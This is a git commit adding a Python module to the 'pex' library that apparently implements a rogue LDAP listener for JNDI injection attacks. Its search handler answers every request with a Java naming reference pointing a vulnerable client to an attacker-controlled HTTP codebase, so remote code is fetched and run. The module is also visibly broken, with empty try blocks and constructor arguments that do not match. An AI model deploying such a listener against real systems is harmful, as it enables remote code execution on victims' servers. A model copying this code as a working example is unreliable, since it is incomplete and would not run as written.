e8387ab5887276769d43df4ca0d29233438aaa6d
Ivan Nikolsky <enty8080@gmail.com>
2022-03-26 13:26:53 +0400

    Create ldap.py

---
+++ pex/listener/ldap.py
@@ -0,0 +1,127 @@
+#!/usr/bin/env python3
+
+#
+# MIT License
+#
+# Copyright (c) 2020-2022 EntySec
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+
+from pex.tools.ldap import LDAPTools
+from pex.tools.string import StringTools
+
+from twisted.application import service
+from twisted.internet.endpoints import serverFromString
+from twisted.internet.protocol import ServerFactory
+from twisted.python.components import registerAdapter
+from twisted.python import log
+
+from ldaptor.inmemory import fromLDIFFile
+from ldaptor.interfaces import IConnectedLDAPEntry
+from ldaptor.protocols.ldap.ldapserver import LDAPServer
+from ldaptor.protocols.ldap import distinguishedname, ldaperrors
+from ldaptor import delta, entry
+from ldaptor.protocols import pureldap, pureber
+
+
+class Handler(LDAPServer):
+    def __init__(self, host, port, payload):
+        self.string_tools = StringTools()
+
+        self.host = host
+        self.port = int(port)        
+        self.payload = payload
+
+        LDAPServer.__init__(self)
+
+    def handle_LDAPSearchRequest(self, request, controls, reply):
+        command = request.baseObject.decode()
+        command = self.string_tools.base64_decode(command.encode())
+
+        class_name = 'Main'
+        reply_url = f'http://{self.host}:{str(self.port)}/'
+
+        attr = [
+            ("javaClassName", [class_name]),
+            ("objectClass", ["javaNamingReference"]),
+            ("javaCodeBase", [reply_url]),
+            ("javaFactory", [class_name])
+        ]
+
+        reply(
+            pureldap.LDAPSearchResultEntry(
+                objectName="",
+                attributes=attr
+            )
+        )
+
+        return pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode)
+
+
+class Factory(ServerFactory):
+    protocol = Handler
+
+    def __init__(self, host, port, root=None):
+        self.root = root
+        super(ServerFactory).__init__()
+
+        self.host = host
+        self.port = int(port)
+
+    def buildProtocol(self, addr):
+        proto = self.protocol(self.host, self.port)
+        proto.debug = self.debug
+        proto.factory = self
+        return proto
+
+
+class LDAPListen:
+    def __init__(self, host, port, methods={}):
+        self.http_tools = LDAPTools()
+        self.handler = Handler
+
+        self.host = host
+        self.port = int(port)
+
+        self.sock = None
+
+    def listen(self):
+        try:
+            
+        except Exception:
+            return False
+
+    def stop(self):
+        try:
+            
+        except Exception:
+            return False
+
+    def accept(self):
+        try:
+            
+        except Exception:
+            return False
+
+
+class LDAPListener:
+    @staticmethod
+    def listen_http(host, port):
+        return LDAPListen(host, port)
